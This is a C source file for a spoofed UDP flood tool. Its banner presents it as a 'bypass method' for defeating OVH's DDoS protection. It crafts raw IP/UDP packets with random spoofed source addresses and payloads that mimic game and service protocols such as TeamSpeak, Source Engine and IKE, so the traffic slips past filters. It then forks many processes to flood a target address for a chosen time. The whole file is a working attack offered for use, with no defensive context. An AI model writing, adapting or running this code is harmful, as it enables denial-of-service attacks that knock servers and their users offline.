#include <time.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <sys/socket.h>
#include <netinet/ip.h>
int ovh_vac_dports[] = {
    80, 177, 389, 443, 500, 1194, 1604, 2302, 3478, 8797, 9987, 20000, 27015, 27018, 30120, 33848
};
in_addr_t util_local_addr()
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    return addr.sin_addr.s_addr;
}
char *rand_host() {
    char *host = malloc(16);
    sprintf(host, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    return host;
}
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short in_cksum(unsigned short* addr, int len)
{
   register int sum = 0;
   u_short answer = 0;
   register u_short* w = addr;
   register int nleft;
   /*
   * Our algorithm is simple, using a 32 bit accumulator (sum), we add
   * sequential 16 bit words to it, and at the end, fold back all the
   * carry bits from the top 16 bits into the lower 16 bits.
   */
   for(nleft = len; nleft > 1; nleft -= 2)
   {
      sum += *w++;
   }
   /* mop up an odd byte, if necessary */
   if(nleft == 1)
   {
      *(u_char*) (&answer) = *(u_char*) w;
      sum += answer;
   }
   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
   sum += (sum >> 16); /* add carry */
   answer = ~sum; /* truncate to 16 bits */
   return answer;
}
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
    struct udp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_UDP;
    pseudohead.length=htons(sizeof(struct udphdr));
    int totaltudp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr);
    unsigned short *udp = malloc(totaltudp_len);
    memcpy((unsigned char *)udp,&pseudohead,sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp+sizeof(struct udp_pseudo),(unsigned char *)udph,sizeof(struct udphdr));
    unsigned short output = csum(udp,totaltudp_len);
    free(udp);
    return output;
}
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void init_ip_headers(struct iphdr *iph, char *rdbuf, char *dhost, int spoof, int protocol) {
    char *shost;
    if(spoof == 1) {
        shost = rand_host();
        iph->saddr = inet_addr(shost);
        free(shost);
    }
    else {
        iph->saddr = util_local_addr();
    }
    iph->daddr = inet_addr(dhost);
    iph->ttl = 64;
    iph->version = 4;
    iph->protocol = protocol;
    iph->ihl = 5;
    iph->id = rand();
    iph->tot_len = sizeof(rdbuf) + sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

}
void init_udp_headers(struct udphdr *udph, int dport, int psize) {
    udph->len = psize;
    udph->source = htons(rand() % 65536);
    udph->dest = htons(dport);
    udph->check = 0;
}
char **str_split(char *buffer, char *delim, size_t *count)
{
    char **retargs, *token;
    retargs = malloc(1 * sizeof(char *));
    token = strtok_r(buffer, delim, &buffer);
    while (token)
    {
        retargs = realloc(retargs, (*count + 1) * sizeof(char *));
        retargs[(*count)++] = token;
        token = strtok_r(NULL, delim, &buffer);
    }
    return retargs;
}

int verify_ip(char *ip)
{
    size_t argc = 0;
    char **args = str_split(ip, ".", &argc);

    if (argc == 4)
    {
        if (atoi(args[0]) < 256 && atoi(args[1]) < 256 && atoi(args[2]) < 256 && atoi(args[3]) < 256)
        {
            free(args);
            return 1;
        }
    }

    free(args);
    return 0;
}
void ovh_vac_flood(char *host, int seconds, int spoof) {
    srand(time(NULL) ^ getpid());
    char rdbuf[4096], *payload;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP), start = time(NULL), port = rand() % sizeof(ovh_vac_dports)/sizeof(ovh_vac_dports[0]);

    struct sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct udphdr *udph = (struct udphdr *) (rdbuf + sizeof(struct iphdr));

    init_ip_headers(iph, rdbuf, host, spoof, IPPROTO_UDP);
    init_udp_headers(udph, 3478, sizeof(payload) - 1 + sizeof(struct iphdr) + sizeof(struct udphdr));

    udph->check = udpcsum(iph, udph);

    switch(port) {
        case 80:
            payload = "\x0e\x00\x00\x00\x00\x00\x00\x00\x00";
            break;
        case 177:
            payload = "\x00\x01\x00\x02\x00\x01\x00";
            break;
        case 389:
            payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00";
            break;
        case 443:
            payload = "\x01\x00\x00\x00\x00\x00\x00\x00\x00";
            break;
        case 500:
            payload = "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01";
            break;
        case 1194:
            payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0";
            break;
        case 1604:
            payload = "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
            break;
        case 2302:  
            payload = "x\x5c\x5c\x73\x74\x61\x74\x75\x73\x5c\x5c";
            break;
        case 3478:
            payload = "\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
            break;
        case 9987:
            payload = "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6";
            break;
        case 20000:
            payload = "\x01";
            break;
        case 27015:
            payload = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65";
            break;
        case 27018:
            payload = "\x20\x51\x75\x65\x72\x79\x00";
            break;
        case 30120:
            payload = "\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73";
            break;
        case 33848:
            payload = "\x00";
            break;
    }
    udph->dest = htons(port);
    udph->len = udph->len + strlen(payload);
    addr.sin_port = htons(port);
    memcpy((void *)udph + sizeof(struct udphdr), payload, sizeof(payload) - 1);

    while(time(NULL) < start + seconds) {
        sendto(sock, rdbuf, (sizeof(payload) - 1) + sizeof(struct iphdr) + sizeof(struct udphdr), 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    }
    close(sock);
}
int main(int argc, char **argv) {
    if(argc != 4) {
        printf("Welcome to blue nurse bypass method coded by urmommy\r\nUsage: %s [host] [time] [forks]\r\nNote there is a random psize between 0 and 512 added onto the psize you give to prevent getting filtered\r\nProtocols used in the method: icmp, tcp, udp\r\nMethod is spoofed by defualt\r\n", argv[0]);
        return -1;
    }

    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    char host[strlen(argv[1]) + 1];
    sprintf(host, "%s", argv[1]);
    if(!verify_ip(host)) {
        printf("Invalid ip address: %s\r\n", argv[1]);
        return -1;
    }

    for(int i = 0; i < atoi(argv[3]); i++) {
        if(!fork()) {
            ovh_vac_flood(argv[1], atoi(argv[2]), 1);
            _exit(0);
        }
    }
    printf("[main] forks initiated bypassing ovh: %s\r\n", argv[1]);
}
